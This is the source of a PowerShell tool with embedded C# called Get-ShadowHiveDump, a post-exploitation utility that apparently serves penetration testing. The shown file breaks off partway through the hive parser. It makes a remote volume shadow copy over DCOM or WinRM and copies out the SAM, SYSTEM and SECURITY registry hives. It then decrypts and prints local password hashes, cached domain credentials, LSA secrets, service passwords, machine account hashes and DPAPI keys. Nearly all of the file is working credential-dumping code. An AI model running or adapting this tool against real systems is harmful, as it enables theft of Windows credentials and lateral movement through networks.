#requires -version 3

Function Get-ShadowHiveDump {
<#
.SYNOPSIS
    Get secrets from registry hives located on a remote computer.
    Privileges required: high

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-ShadowHiveDump makes a copy of the SAM, SYSTEM and SECURITY hives via VSS from a remote computer, then extracts secrets from local copy.
    The hive parser's code is mostly stolen from CVE-2021-36934 exploit by @cube0x0.

.PARAMETER ComputerName
    Specifies the target host.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER Authentication
    Specifies what authentication method should be used.

.PARAMETER Protocol
    Specifies the protocol to use, defaults to DCOM.

.EXAMPLE
    PS C:\> Get-ShadowHiveDump -ComputerName SRV.ADATUM.CORP

.EXAMPLE
    PS C:\> Get-ShadowHiveDump -ComputerName SRV.ADATUM.CORP -Credential ADATUM\Administrator -Protocol Wsman
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('Default', 'Kerberos', 'Negotiate', 'NtlmDomain')]
        [String]
        $Authentication = 'Default',

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom'
    )

    BEGIN {
        $cimOption = New-CimSessionOption -Protocol $Protocol
        $psOption = New-PSSessionOption -NoMachineProfile
        try {
            if (-not $PSBoundParameters['ComputerName']) {
                $cimSession = New-CimSession -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if ($Protocol -eq 'Wsman') {
                    $psSession = New-PSSession -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
            elseif ($Credential.Username) {
                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if ($Protocol -eq 'Wsman') {
                    $psSession = New-PSSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
            else {
                $cimSession = New-CimSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if ($Protocol -eq 'Wsman') {
                    $psSession = New-PSSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
        }
        catch [Management.Automation.PSArgumentOutOfRangeException] {
            Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
            break
        }
        catch [Microsoft.Management.Infrastructure.CimException] {
            if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8033810c,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
                break
            }
            if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                Write-Verbose "[$ComputerName] Access denied."
                break
            }
            else {
                Write-Verbose "[$ComputerName] Failed to establish CIM session."
                break
            }
        }
        catch [Management.Automation.Remoting.PSRemotingTransportException] {
            Write-Verbose "[$ComputerName] Failed to establish PSRemoting session."
            break
        }
    }

    PROCESS {
        Write-Verbose "[$ComputerName] Creating a shadow copy of volume 'C:\'"
        $process = Invoke-CimMethod -ClassName Win32_ShadowCopy -Name Create -Arguments @{Context="ClientAccessible"; Volume="C:\"} -CimSession $cimSession -ErrorAction Stop -Verbose:$false
        $shadowCopy = Get-CimInstance -ClassName Win32_ShadowCopy -Filter "ID='$($process.ShadowID)'" -CimSession $cimSession -Verbose:$false
        if ($Protocol -eq 'Wsman') {
            $deviceObject = $shadowCopy.DeviceObject.ToString()
            $tempDir = "C:\Windows\Temp\dump"
            $process = Invoke-CimMethod -ClassName Win32_Process -Name create -Arguments @{CommandLine="cmd.exe /c mklink $tempDir $deviceObject"} -CimSession $cimSession -Verbose:$false
            do {
                Start-Sleep -m 250
            }
            until ((Get-CimInstance -ClassName Win32_Process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession -Verbose:$false | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
        }
        else {
            if ($Credential.UserName) {
                $logonToken = Invoke-UserImpersonation -Credential $Credential
            }

            # Create a SafeFileHandle of the UNC path
            $handle = [Native]::CreateFileW(
                "\\$ComputerName\C$",
                [Security.AccessControl.FileSystemRights]"ListDirectory",
                [IO.FileShare]::ReadWrite,
                [IntPtr]::Zero,
                [IO.FileMode]::Open,
                0x02000000,
                [IntPtr]::Zero
            )
            if ($handle.IsInvalid) {
                Write-Error -Message "CreateFileW failed"
            }
            # Invoke NtFsControlFile to access the snapshots
            $transDataSize = [Runtime.InteropServices.Marshal]::SizeOf([Type][Native+NT_Trans_Data])
            $bufferSize = $transDataSize + 4
            $outBuffer = [Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
            $ioBlock = New-Object -TypeName Native+IO_STATUS_BLOCK
            [Native]::NtFsControlFile($handle, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null
        }

        $outputDirectory = "$Env:TEMP\$ComputerName"
        New-Item -ItemType Directory -Force -Path $outputDirectory | Out-Null
        Write-Verbose "[$ComputerName] Copying the registry hives into $(Resolve-Path $outputDirectory)"
        if ($Protocol -eq 'Wsman') {
            # Download files via PSRemoting
            $samBackupPath = "$tempDir\Windows\System32\config\SAM"
            $systemBackupPath = "$tempDir\Windows\System32\config\SYSTEM"
            $securityBackupPath = "$tempDir\Windows\System32\config\SECURITY"
            Copy-Item -Path "$samBackupPath" -Destination "$outputDirectory" -FromSession $psSession
            Copy-Item -Path "$systemBackupPath" -Destination "$outputDirectory" -FromSession $psSession
            Copy-Item -Path "$securityBackupPath" -Destination "$outputDirectory" -FromSession $psSession

            # Delete the shadow link
            Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$($tempDir -Replace '\\','\\')'" -CimSession $cimSession -Verbose:$false | Remove-CimInstance
        }
        else {
            # Download files via SMB
            $shadowPath = $shadowCopy.InstallDate.ToUniversalTime().ToString("'@GMT-'yyyy.MM.dd-HH.mm.ss")
            $samBackupPath = "\\$ComputerName\C$\$shadowPath\Windows\System32\config\SAM"
            $systemBackupPath = "\\$ComputerName\C$\$shadowPath\Windows\System32\config\SYSTEM"
            $securityBackupPath = "\\$ComputerName\C$\$shadowPath\Windows\System32\config\SECURITY"
            Copy-Item -Path "$samBackupPath" -Destination "$outputDirectory"
            Copy-Item -Path "$systemBackupPath" -Destination "$outputDirectory"
            Copy-Item -Path "$securityBackupPath" -Destination "$outputDirectory"

            # Close the handle
            $handle.Dispose()

            if ($logonToken) {
                Invoke-RevertToSelf -TokenHandle $logonToken
            }
        }

        Write-Verbose "[$ComputerName] Cleaning up the shadow copy"
        $shadowCopy | Remove-CimInstance -Verbose:$false

        Write-Verbose "[$ComputerName] Extracting secrets from hive copy"
        [HiveParser]::ParseSecrets("$outputDirectory\SAM", "$outputDirectory\SYSTEM", "$outputDirectory\SECURITY")

        # Delete local copy
        Remove-Item -Recurse $outputDirectory
    }

    END {
        Remove-CimSession -CimSession $cimSession
        if ($Protocol -eq 'Wsman') {
            Remove-PSSession -Session $psSession
        }
    }
}

# Adapted from PowerView by @harmj0y and @mattifestation
Function Local:Invoke-UserImpersonation {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    if (([Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if ($PSBoundParameters['TokenHandle']) {
        $LogonTokenHandle = $TokenHandle
    }
    else {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
        Write-Verbose "[UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"

        if (-not [Native]::LogonUserA($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)) {
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            throw "[UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }

    if (-not [Native]::ImpersonateLoggedOnUser($LogonTokenHandle)) {
        throw "[UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
    $LogonTokenHandle
}

Function Local:Invoke-RevertToSelf {
    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    if ($PSBoundParameters['TokenHandle']) {
        Write-Verbose "[RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        [Native]::CloseHandle($TokenHandle) | Out-Null
    }
    if (-not [Native]::RevertToSelf()) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "[RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
}

Add-Type -TypeDefinition @'
using Microsoft.Win32.SafeHandles;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Security.Cryptography;

public class Native
{
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupAccountName(
        string lpSystemName,
        string lpAccountName,
        [MarshalAs(UnmanagedType.LPArray)] byte[] Sid,
        ref uint cbSid,
        System.Text.StringBuilder ReferencedDomainName,
        ref uint cchReferencedDomainName,
        out SID_NAME_USE peUse
    );

    public enum SID_NAME_USE {
        SidTypeUser = 1,
        SidTypeGroup,
        SidTypeDomain,
        SidTypeAlias,
        SidTypeWellKnownGroup,
        SidTypeDeletedAccount,
        SidTypeInvalid,
        SidTypeUnknown,
        SidTypeComputer
    }

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LogonUserA(
        string lpszUserName, 
        string lpszDomain,
        string lpszPassword,
        int dwLogonType, 
        int dwLogonProvider,
        ref IntPtr  phToken
    );

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    public struct IO_STATUS_BLOCK
    {
        public UInt32 Status;
        public UInt32 Information;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct NT_Trans_Data
    {
        public UInt32 NumberOfSnapShots;
        public UInt32 NumberOfSnapShotsReturned;
        public UInt32 SnapShotArraySize;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern SafeFileHandle CreateFileW(
        string lpFileName,
        FileSystemRights dwDesiredAccess,
        FileShare dwShareMode,
        IntPtr lpSecurityAttributes,
        FileMode dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("ntdll.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern UInt32 NtFsControlFile(
        SafeFileHandle hDevice,
        IntPtr Event,
        IntPtr ApcRoutine,
        IntPtr ApcContext,
        ref IO_STATUS_BLOCK IoStatusBlock,
        UInt32 FsControlCode,
        IntPtr InputBuffer,
        UInt32 InputBufferLength,
        IntPtr OutputBuffer,
        UInt32 OutputBufferLength);
}

public class HiveParser {

    public static void ParseSecrets(string sampath, string systempath, string securitypath)
    {
        StringBuilder sb = new StringBuilder();
        byte[] bootKey = new byte[16];

        RegistryHive system = RegistryHive.ImportHiveDump(systempath);
        if (system != null)
        {
            bootKey = Registry.GetBootKey(system);
            if (bootKey == null)
            {
                sb.AppendLine("[-] Failed to parse bootkey");
                return;
            }
        }
        else
        {
            sb.AppendLine("[-] Unable to access to SYSTEM dump file");
        }

        RegistryHive sam = RegistryHive.ImportHiveDump(sampath);
        if (sam != null)
        {
            Registry.ParseSam(bootKey, sam).ForEach(item => sb.Append(item + Environment.NewLine));
        }
        else
        {
            sb.AppendLine("[-] Unable to access to SAM dump file");
        }

        RegistryHive security = RegistryHive.ImportHiveDump(securitypath);
        if (security != null)
        {
            Registry.ParseLsa(security, bootKey, system).ForEach(item => sb.Append(item + Environment.NewLine));
        }
        else
        {
            sb.AppendLine("[-] Unable to access to SECURITY dump file");
        }

        Console.WriteLine(sb.ToString());
    }
}

public class RegistryHive
{
    public static RegistryHive ImportHiveDump(string dumpfileName)
    {
        if (File.Exists(dumpfileName))
        {
            using (FileStream stream = File.OpenRead(dumpfileName))
            {
                using (BinaryReader reader = new BinaryReader(stream))
                {
                    reader.BaseStream.Position += 4132 - reader.BaseStream.Position;
                    RegistryHive hive = new RegistryHive(reader);
                    return hive;
                }
            }
        }
        else
        {
            Console.WriteLine("[-] Unable to access hive dump ", dumpfileName);
            return null;
        }
    }

    public RegistryHive(BinaryReader reader)
    {
        reader.BaseStream.Position += 4132 - reader.BaseStream.Position;
        this.RootKey = new NodeKey(reader);
    }

    public string Filepath { get; set; }
    public NodeKey RootKey { get; set; }
    public bool WasExported { get; set; }
}

public class Registry
{
    private static byte[] StringToByteArray(string hex)
    {
        return Enumerable.Range(0, hex.Length)
            .Where(x => x % 2 == 0)
            .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
            .ToArray();
    }

    public static byte[] GetBootKey(RegistryHive systemHive)
    {
        ValueKey controlSet = GetValueKey(systemHive, "Select\\Default");
        int cs = BitConverter.ToInt32(controlSet.Data, 0);

        StringBuilder scrambledKey = new StringBuilder();
        foreach (string key in new string[] { "JD", "Skew1", "GBG", "Data" })
        {
            NodeKey nk = GetNodeKey(systemHive, "ControlSet00" + cs + "\\Control\\Lsa\\" + key);

            for (int i = 0; i < nk.ClassnameLength && i < 8; i++)
                scrambledKey.Append((char)nk.ClassnameData[i * 2]);
        }

        byte[] skey = StringToByteArray(scrambledKey.ToString());
        byte[] descramble = new byte[] { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
                                            0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };

        byte[] bootkey = new byte[16];
        for (int i = 0; i < bootkey.Length; i++)
            bootkey[i] = skey[descramble[i]];

        return bootkey;
    }

    private static byte[] GetHashedBootKey(byte[] bootKey, byte[] fVal)
    {
        byte[] domainData = fVal.Skip(104).ToArray();
        byte[] hashedBootKey;

        //old style hashed bootkey storage
        if (domainData[0].Equals(0x01))
        {
            byte[] f70 = fVal.Skip(112).Take(16).ToArray();
            List<byte> data = new List<byte>();
            data.AddRange(f70);
            data.AddRange(Encoding.ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"));
            data.AddRange(bootKey);
            data.AddRange(Encoding.ASCII.GetBytes("0123456789012345678901234567890123456789\0"));
            byte[] md5 = MD5.Create().ComputeHash(data.ToArray());
            byte[] f80 = fVal.Skip(128).Take(32).ToArray();
            hashedBootKey = Crypto.RC4Encrypt(md5, f80);
        }

        //new version of storage -- Win 2016 / Win 10 (potentially Win 2012) and above
        else if (domainData[0].Equals(0x02))
        {
            byte[] sk_Salt_AES = domainData.Skip(16).Take(16).ToArray();
            int sk_Data_Length = BitConverter.ToInt32(domainData, 12);
            // int offset = BitConverter.ToInt32(v,12) + 204;
            byte[] sk_Data_AES = domainData.Skip(32).Take(sk_Data_Length).ToArray();
            hashedBootKey = Crypto.DecryptAES_CBC(sk_Data_AES, bootKey, sk_Salt_AES);
        }
        else
        {
            Console.WriteLine("[-] Error parsing hashed bootkey");
            return null;
        }
        return hashedBootKey;
    }

    public static List<string> ParseSam(byte[] bootKey, RegistryHive sam)
    {
        List<string> retVal = new List<string>
        {
            "[*] SAM hashes"
        };
        try
        {
            NodeKey nk = GetNodeKey(sam, @"SAM\Domains\Account");
            byte[] fVal = nk.getChildValues("F");
            byte[] hashedBootKey = GetHashedBootKey(bootKey, fVal);
            NodeKey targetNode = nk.ChildNodes.Find(x => x.Name.Contains("Users"));
            byte[] antpassword = Encoding.ASCII.GetBytes("NTPASSWORD\0");
            byte[] almpassword = Encoding.ASCII.GetBytes("LMPASSWORD\0");
            foreach (NodeKey user in targetNode.ChildNodes.Where(x => x.Name.Contains("00000")))
            {
                byte[] rid = BitConverter.GetBytes(System.Int32.Parse(user.Name, System.Globalization.NumberStyles.HexNumber));
                byte[] v = user.getChildValues("V");
                int offset = BitConverter.ToInt32(v, 12) + 204;
                int length = BitConverter.ToInt32(v, 16);
                string username = Encoding.Unicode.GetString(v.Skip(offset).Take(length).ToArray());

                //there are 204 bytes of headers / flags prior to data in the encrypted key data structure
                int lmHashOffset = BitConverter.ToInt32(v, 156) + 204;
                int lmHashLength = BitConverter.ToInt32(v, 160);
                int ntHashOffset = BitConverter.ToInt32(v, 168) + 204;
                int ntHashLength = BitConverter.ToInt32(v, 172);
                string lmHash = "aad3b435b51404eeaad3b435b51404ee";
                string ntHash = "31d6cfe0d16ae931b73c59d7e0c089c0";

                //old style hashes
                if (v[ntHashOffset + 2].Equals(0x01))
                {
                    IEnumerable<byte> lmKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(almpassword);
                    byte[] lmHashDecryptionKey = MD5.Create().ComputeHash(lmKeyParts.ToArray());
                    IEnumerable<byte> ntKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(antpassword);
                    byte[] ntHashDecryptionKey = MD5.Create().ComputeHash(ntKeyParts.ToArray());
                    byte[] encryptedLmHash = null;
                    byte[] encryptedNtHash = null;

                    if (ntHashLength == 20)
                    {
                        encryptedNtHash = v.Skip(ntHashOffset + 4).Take(16).ToArray();
                        byte[] obfuscatedNtHashTESTING = Crypto.RC4Encrypt(ntHashDecryptionKey, encryptedNtHash);
                        ntHash = Crypto.DecryptSingleHash(obfuscatedNtHashTESTING, user.Name).Replace("-", "");
                    }
                    if (lmHashLength == 20)
                    {
                        encryptedLmHash = v.Skip(lmHashOffset + 4).Take(16).ToArray();
                        byte[] obfuscatedLmHashTESTING = Crypto.RC4Encrypt(lmHashDecryptionKey, encryptedLmHash);
                        lmHash = Crypto.DecryptSingleHash(obfuscatedLmHashTESTING, user.Name).Replace("-", "");
                    }
                }
                //new-style hashes
                else
                {
                    byte[] enc_LM_Hash = v.Skip(lmHashOffset).Take(lmHashLength).ToArray();
                    byte[] lmData = enc_LM_Hash.Skip(24).ToArray();
                    //if a hash exists, otherwise we have to return the default string val
                    if (lmData.Length > 0)
                    {
                        byte[] lmHashSalt = enc_LM_Hash.Skip(8).Take(16).ToArray();
                        byte[] desEncryptedHash = Crypto.DecryptAES_CBC(lmData, hashedBootKey.Take(16).ToArray(), lmHashSalt).Take(16).ToArray();
                        lmHash = Crypto.DecryptSingleHash(desEncryptedHash, user.Name).Replace("-", "");
                    }

                    byte[] enc_NT_Hash = v.Skip(ntHashOffset).Take(ntHashLength).ToArray();
                    byte[] ntData = enc_NT_Hash.Skip(24).ToArray();
                    //if a hash exists, otherwise we have to return the default string val
                    if (ntData.Length > 0)
                    {
                        byte[] ntHashSalt = enc_NT_Hash.Skip(8).Take(16).ToArray();
                        byte[] desEncryptedHash = Crypto.DecryptAES_CBC(ntData, hashedBootKey.Take(16).ToArray(), ntHashSalt).Take(16).ToArray();
                        ntHash = Crypto.DecryptSingleHash(desEncryptedHash, user.Name).Replace("-", "");
                    }
                }
                string ridStr = System.Int32.Parse(user.Name, System.Globalization.NumberStyles.HexNumber).ToString();
                string hashes = (lmHash + ":" + ntHash);
                retVal.Add(string.Format("{0}:{1}:{2}", username, ridStr, hashes.ToLower()));
            }
        }
        catch (Exception e)
        {
            retVal.Add("[-] Error parsing SAM dump file: " + e.ToString());
        }
        return retVal;
    }

    public static List<string> ParseLsa(RegistryHive security, byte[] bootKey, RegistryHive system)
    {
        List<string> retVal = new List<string>();
        try
        {
            byte[] fVal = GetValueKey(security, @"Policy\PolEKList\Default").Data;
            LsaSecret record = new LsaSecret(fVal);
            byte[] dataVal = record.data.Take(32).ToArray();
            byte[] tempKey = Crypto.ComputeSha256(bootKey, dataVal);
            byte[] dataVal2 = record.data.Skip(32).Take(record.data.Length - 32).ToArray();
            byte[] decryptedLsaKey = Crypto.DecryptAES_ECB(dataVal2, tempKey).Skip(68).Take(32).ToArray();

            //get NLKM Secret
            byte[] nlkmKey = null;
            NodeKey nlkm = GetNodeKey(security, @"Policy\Secrets\NL$KM");
            if (nlkm != null)
            {
                retVal.Add("[*] Cached domain logon information (domain/username:hash)");
                nlkmKey = DumpSecret(nlkm, decryptedLsaKey);
                foreach (ValueKey cachedLogin in GetNodeKey(security, @"Cache").ChildValues)
                {
                    if (string.Compare(cachedLogin.Name, "NL$Control", StringComparison.OrdinalIgnoreCase) != 0 && !IsZeroes(cachedLogin.Data.Take(16).ToArray()))
                    {
                        NL_Record cachedUser = new NL_Record(cachedLogin.Data);
                        byte[] plaintext = Crypto.DecryptAES_CBC(cachedUser.encryptedData, nlkmKey.Skip(16).Take(16).ToArray(), cachedUser.IV);
                        byte[] hashedPW = plaintext.Take(16).ToArray();
                        string username = Encoding.Unicode.GetString(plaintext.Skip(72).Take(cachedUser.userLength).ToArray());
                        string domain = Encoding.Unicode.GetString(plaintext.Skip(72 + Pad(cachedUser.userLength) + Pad(cachedUser.domainNameLength)).Take(Pad(cachedUser.dnsDomainLength)).ToArray());
                        domain = domain.Replace("\0", "");
                        retVal.Add(string.Format("{0}/{1}:$DCC2$10240#{2}#{3}", domain, username, username, BitConverter.ToString(hashedPW).Replace("-", "").ToLower()));
                    }
                }
            }

            try
            {
                retVal.Add("[*] LSA Secrets");
                foreach (NodeKey secret in GetNodeKey(security, @"Policy\Secrets").ChildNodes)
                {
                    if (string.Compare(secret.Name, "NL$Control", StringComparison.OrdinalIgnoreCase) != 0)
                    {
                        if (string.Compare(secret.Name, "NL$KM", StringComparison.OrdinalIgnoreCase) != 0)
                        {
                            LsaSecretBlob secretBlob = new LsaSecretBlob(DumpSecret(secret, decryptedLsaKey));
                            if (secretBlob.length > 0)
                            {
                                retVal.Add(PrintSecret(secret.Name, secretBlob, system));
                            }
                        }
                        else
                        {
                            LsaSecretBlob secretBlob = new LsaSecretBlob(nlkmKey);
                            if (secretBlob.length > 0)
                            {
                                retVal.Add(PrintSecret(secret.Name, secretBlob, system));
                            }
                        }
                    }
                }
            }
            catch
            {
                retVal.Add("[-] No secrets to parse");
            }
        }
        catch (Exception e)
        {
            retVal.Add("[-] Error parsing SECURITY dump file: " + e.ToString());
        }
        return retVal;
    }

    private static int Pad(int data)
    {
        if ((data & 0x3) > 0)
        {
            return (data + (data & 0x3));
        }
        else
        {
            return data;
        }
    }

    private static bool IsZeroes(byte[] inputArray)
    {
        foreach (byte b in inputArray)
        {
            if (b != 0x00)
            {
                return false;
            }
        }
        return true;
    }

    private static string PrintSecret(string keyName, LsaSecretBlob secretBlob, RegistryHive system)
    {
        string secretOutput = string.Format("[*] {0}\r\n", keyName);

        if (keyName.ToUpper().StartsWith("_SC_"))
        {
            ValueKey startName = GetValueKey(system, string.Format(@"ControlSet001\Services\{0}\ObjectName", keyName.Substring(4)));
            string pw = Encoding.Unicode.GetString(secretBlob.secret.ToArray());
            secretOutput += string.Format("{0}:{1}", Encoding.UTF8.GetString(startName.Data), pw);
        }
        else if (keyName.ToUpper().StartsWith("$MACHINE.ACC"))
        {
            string computerAcctHash = BitConverter.ToString(Crypto.Md4Hash2(secretBlob.secret)).Replace("-", "").ToLower();
            ValueKey domainName = GetValueKey(system, @"ControlSet001\Services\Tcpip\Parameters\Domain");
            ValueKey computerName = GetValueKey(system, @"ControlSet001\Services\Tcpip\Parameters\Hostname");
            secretOutput += string.Format("{0}\\{1}$:aad3b435b51404eeaad3b435b51404ee:{2}", Encoding.UTF8.GetString(domainName.Data), Encoding.UTF8.GetString(computerName.Data), computerAcctHash);
        }
        else if (keyName.ToUpper().StartsWith("DPAPI"))
        {
            secretOutput += ("dpapi_machinekey:" + BitConverter.ToString(secretBlob.secret.Skip(4).Take(20).ToArray()).Replace("-", "").ToLower() + "\r\n");
            secretOutput += ("dpapi_userkey:" + BitConverter.ToString(secretBlob.secret.Skip(24).Take(20).ToArray()).Replace("-", "").ToLower());
        }
        else if (keyName.ToUpper().StartsWith("NL$KM"))
        {
            secretOutput += ("NL$KM:" + BitConverter.ToString(secretBlob.secret).Replace("-", "").ToLower());
        }
        else if (keyName.ToUpper().StartsWith("ASPNET_WP_PASSWORD"))
        {
            secretOutput += ("ASPNET:" + System.Text.Encoding.Unicode.GetString(secretBlob.secret));
        }
        else
        {
            secretOutput += ("[!] Secret type not supported yet - outputing raw secret as unicode:\r\n");
            secretOutput += (System.Text.Encoding.Unicode.GetString(secretBlob.secret));
        }
        return secretOutput;
    }

    private static byte[] DumpSecret(NodeKey secret, byte[] lsaKey)
    {
        NodeKey secretCurrVal = secret.ChildNodes.Find(x => x.Name.Contains("CurrVal"));
        byte[] value = secretCurrVal.getChildValues("Default");
        LsaSecret record = new LsaSecret(value);
        byte[] tempKey = Crypto.ComputeSha256(lsaKey, record.data.Take(32).ToArray());
        byte[] dataVal2 = record.data.Skip(32).Take(record.data.Length - 32).ToArray();
        byte[] plaintext = Crypto.DecryptAES_ECB(dataVal2, tempKey);

        return (plaintext);
    }

    private static NodeKey GetNodeKey(RegistryHive hive, string path)
    {
        NodeKey node = null;
        string[] paths = path.Split('\\');

        foreach (string ch in paths)
        {
            bool found = false;
            if (node == null)
                node = hive.RootKey;

            foreach (NodeKey child in node.ChildNodes)
            {
                if (child.Name == ch)
                {
                    node = child;
                    found = true;
                    break;
                }
            }
            if (found == false)
            {
                return null;
            }
        }
        return node;
    }

    public static ValueKey GetValueKey(RegistryHive hive, string path)
    {
        string keyname = path.Split('\\').Last();
        path = path.Substring(0, path.LastIndexOf('\\'));

        NodeKey node = GetNodeKey(hive, path);

        return node.ChildValues.SingleOrDefault(v => v.Name == keyname);
    }
}

internal class NL_Record
{
    public NL_Record(byte[] inputData)
    {
        userLength = BitConverter.ToInt16(inputData.Take(2).ToArray(), 0);
        domainNameLength = BitConverter.ToInt16(inputData.Skip(2).Take(2).ToArray(), 0);
        dnsDomainLength = BitConverter.ToInt16(inputData.Skip(60).Take(2).ToArray(), 0);
        IV = inputData.Skip(64).Take(16).ToArray();
        encryptedData = inputData.Skip(96).Take(inputData.Length - 96).ToArray();
    }

    public int userLength { get; set; }
    public int domainNameLength { get; set; }
    public int dnsDomainLength { get; set; }
    public byte[] IV { get; set; }
    public byte[] encryptedData { get; set; }
}

public class NodeKey
{
    public NodeKey(BinaryReader hive)
    {
        ReadNodeStructure(hive);
        ReadChildrenNodes(hive);
        ReadChildValues(hive);
    }

    public List<NodeKey> ChildNodes { get; set; }
    public List<ValueKey> ChildValues { get; set; }
    public DateTime Timestamp { get; set; }
    public int ParentOffset { get; set; }
    public int SubkeysCount { get; set; }
    public int LFRecordOffset { get; set; }
    public int ClassnameOffset { get; set; }
    public int SecurityKeyOffset { get; set; }
    public int ValuesCount { get; set; }
    public int ValueListOffset { get; set; }
    public short NameLength { get; set; }
    public bool IsRootKey { get; set; }
    public short ClassnameLength { get; set; }
    public string Name { get; set; }
    public byte[] ClassnameData { get; set; }
    public NodeKey ParentNodeKey { get; set; }

    private void ReadNodeStructure(BinaryReader hive)
    {
        byte[] buf = hive.ReadBytes(4);

        if (buf[0] != 0x6e || buf[1] != 0x6b)
            throw new NotSupportedException("Bad nk header");

        long startingOffset = hive.BaseStream.Position;
        this.IsRootKey = (buf[2] == 0x2c) ? true : false;

        this.Timestamp = DateTime.FromFileTime(hive.ReadInt64());

        hive.BaseStream.Position += 4;

        this.ParentOffset = hive.ReadInt32();
        this.SubkeysCount = hive.ReadInt32();

        hive.BaseStream.Position += 4;

        this.LFRecordOffset = hive.ReadInt32();

        hive.BaseStream.Position += 4;

        this.ValuesCount = hive.ReadInt32();
        this.ValueListOffset = hive.ReadInt32();
        this.SecurityKeyOffset = hive.ReadInt32();
        this.ClassnameOffset = hive.ReadInt32();

        hive.BaseStream.Position += (startingOffset + 68) - hive.BaseStream.Position;

        this.NameLength = hive.ReadInt16();
        this.ClassnameLength = hive.ReadInt16();

        buf = hive.ReadBytes(this.NameLength);
        this.Name = System.Text.Encoding.UTF8.GetString(buf);

        hive.BaseStream.Position = this.ClassnameOffset + 4 + 4096;
        this.ClassnameData = hive.ReadBytes(this.ClassnameLength);
    }

    private void ReadChildrenNodes(BinaryReader hive)
    {
        this.ChildNodes = new List<NodeKey>();
        if (this.LFRecordOffset != -1)
        {
            hive.BaseStream.Position = 4096 + this.LFRecordOffset + 4;

            byte[] buf = hive.ReadBytes(2);

            //ri
            if (buf[0] == 0x72 && buf[1] == 0x69)
            {
                int count = hive.ReadInt16();

                for (int i = 0; i < count; i++)
                {
                    long pos = hive.BaseStream.Position;
                    int offset = hive.ReadInt32();
                    hive.BaseStream.Position = 4096 + offset + 4;
                    buf = hive.ReadBytes(2);

                    if (!(buf[0] == 0x6c && (buf[1] == 0x66 || buf[1] == 0x68)))
